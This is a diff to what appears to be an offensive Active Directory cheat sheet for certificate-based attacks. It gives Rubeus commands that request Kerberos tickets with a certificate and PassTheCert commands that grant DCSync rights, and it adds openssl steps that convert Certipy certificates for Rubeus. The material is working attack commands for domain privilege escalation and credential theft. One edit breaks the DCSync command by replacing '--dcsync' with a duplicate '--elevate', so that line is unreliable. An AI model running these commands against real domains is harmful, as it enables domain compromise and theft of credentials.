@@ -10,15 +10,28 @@
 
 #### 2) From a base64 PFX
 
- - Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASS"
+ - Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
 
 #### 3) Grant DCSync rights to a user
 
- - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --dcsync
+ - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --elevate
 
 #### 4) To restore
 
  - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --restore
+
+### PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.
+
+ - openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
+
+### Certipy uses DER encryption. To generate a PFX for Rubeus, openssl can be used.
+
+ - openssl rsa -inform DER -in key.key -out key-pem.key
+
+ - openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
+
+ - openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
+
 
 ## Linux
 
